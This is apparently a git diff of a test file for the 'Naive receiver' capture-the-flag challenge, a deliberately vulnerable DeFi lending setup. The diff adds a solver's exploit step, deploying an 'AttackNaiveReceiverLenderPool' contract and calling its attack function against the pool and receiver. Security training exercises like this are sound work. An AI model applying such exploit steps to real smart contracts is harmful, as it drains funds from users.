@@ -16,6 +16,7 @@ describe('[Challenge] Naive receiver', function () {
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        const AttackNaiveReceiverLenderPool = await ethers.getContractFactory('AttackNaiveReceiverLenderPool', deployer)
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
@@ -27,10 +28,13 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+
+        this.attackLenderPool = await AttackNaiveReceiverLenderPool.deploy()
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        await this.attackLenderPool.connect(attacker).attack(this.pool.address, this.receiver.address, ethers.utils.parseEther('1000'))
     });
 
     after(async function () {
